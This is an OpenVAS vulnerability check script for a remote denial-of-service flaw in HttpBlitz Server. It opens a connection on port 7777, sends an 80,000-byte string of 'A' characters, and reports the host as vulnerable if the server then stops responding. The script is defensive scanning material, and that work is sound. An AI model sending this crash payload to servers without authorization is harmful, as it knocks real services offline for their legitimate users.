###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_HttpBlitz_45573.nasl 13 2013-10-27 12:16:33Z jan $
#
# HttpBlitz Server HTTP Request Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "HttpBlitz Server is prone to a remote denial-of-service vulnerability.

Attackers can exploit this issue to cause the application to crash,
denying service to legitimate users.";


if (description)
{
 script_id(100949);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)");
 script_bugtraq_id(45573);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_name("HttpBlitz Server HTTP Request Remote Denial of Service Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45573");
 script_xref(name : "URL" , value : "http://www.sourceforge.net/projects/httpblitz/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if HttpBlitz Server is prone to a remote denial-of-service vulnerability");
 script_category(ACT_DENIAL);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 7777);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:7777);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner || "Server:" >< banner)exit(0);

if(!soc = open_sock_tcp(port))exit(0);

ex = crap(data:raw_string(0x41), length:80000);
send(socket:soc, data:string(ex,"\r\n"));

sleep(2);

if(http_is_dead(port:port)) {
  security_warning(port:port);
  exit(0);
}  

exit(0);
